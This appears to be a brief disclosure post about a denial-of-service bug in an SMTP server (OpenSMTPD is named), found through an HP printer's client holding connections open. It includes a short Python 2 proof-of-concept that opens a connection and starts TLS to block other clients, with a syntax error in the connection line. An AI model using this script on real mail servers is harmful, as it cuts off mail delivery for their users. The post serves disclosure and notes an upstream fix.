I discovered this accidentally, as I noticed my HP printer's smtp client would keep the connection indefinitely open after an unsuccessful authentication attempt, causing no more mail to be delivered until I SIGKILL'd my smtpd process or unplugged my printer.  The following reproduces the attack trivially:      #!/usr/bin/env python2     import smtplib     import time     print "[+] Connecting to server and initiating TLS"     smtp = smtplib.SMTP("mail.some-vitim-host.blah",     smtp.starttls()     print "[+] No clients will be able to connect as long as this remains open."      Apparently this was fixed recently upstream, noting "evil client" in the commit message:  A snapshot has been posted to http://www.opensmtpd.org/archives/ , but no patch release has yet been made.
